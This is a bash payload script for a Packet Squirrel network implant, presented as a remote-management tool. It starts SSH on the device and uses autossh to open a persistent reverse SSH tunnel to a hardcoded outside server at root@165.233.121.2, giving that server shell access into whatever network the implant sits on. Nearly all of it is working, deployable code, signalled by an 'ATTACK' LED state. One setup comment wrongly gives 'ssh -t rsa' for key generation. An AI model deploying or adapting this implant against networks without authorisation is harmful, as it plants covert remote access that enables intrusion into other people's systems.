#!/bin/bash
# Title: SSH Remote Management Tool for Packet Squirrel
# Description: Makes packet Squirrel directly accessible via SSH on a remote server
# Author: BlackPropaganda
# Version: 0.1
# Category: Remote-Access
# Net Mode: NAT
# Firmware: 1.2
#
# LED State Descriptions
# Magenta Solid - SSH connecting
# Amber - SSH connection successful
#

NETMODE NAT
LED SETUP

# no pass needed, headless mode required so RSA key file is used.
#
# generate the key by running the following command in the /root/.ssh/ folder:
# 'ssh -t rsa -b 2048 -f id_rsa'
#
# To ensure that this works as intended, the user will have to connect to this host at least once
# with ssh -i /root/.ssh/id_rsa username@remote_server_ip to add this server to the squirrels list
# of trusted hosts.
#
# If this step fails, the payload will fail.

autossh_host="root@165.233.121.2"
autossh_host_ip=$(echo $autossh_host | cut -d '@' -f2)
autossh_port="22"
autossh_remoteport="2222"
autossh_localport="22"

if ! grep $autossh_host_ip /root/.ssh/known_hosts; then
   echo "$autossh_host not in known_hosts, exiting..." >> /root/autossh.log
   LED FAIL
   exit 1
fi

#
# For the life of me I couldn't get SSH to work. The funny thing was it would
# run in the shell command, but not in the payload. The following solution
# implements a tool called autossh which ensures nothing funky happens to the
# connection.
#
# the following was ripped from dark_pyrro (the legend) via:
# https://codeberg.org/dark_pyrro/Packet-Squirrel-autossh/src/branch/main/payload.sh
#

# waiting until eth1 acquires IP address
while ! ifconfig "eth1" | grep "inet addr"; do sleep 1; done

echo -e "starting server.\n" >> /root/payloads/switch3/debug.txt

# starting sshd and waiting for process to start
/etc/init.d/sshd start
until netstat -tulpn | grep -qi "sshd"
do
    sleep 1
done

# stopping autossh
/etc/init.d/autossh stop

#
# Much like the SSH server, AutoSSH has a configuration file. This
# needs to be configured to support this connection as a daemon.
#
# Create a "fresh template" for the autossh configuration
# Starting with an empty autossh file in /etc/config
# isn't something that uci is very fond of
echo "config autossh" > /etc/config/autossh
echo "        option ssh" >> /etc/config/autossh
echo "        option enabled" >> /etc/config/autossh


# UCI configuration and commission
uci set autossh.@autossh[0].ssh="-i /root/.ssh/id_rsa -R "$autossh_remoteport":127.0.0.1:"$autossh_localport" "$autossh_host" -p "$autossh_port" -N -T"
uci set autossh.@autossh[0].enabled="1"
uci commit autossh

LED ATTACK

# starting autossh
/etc/init.d/autossh start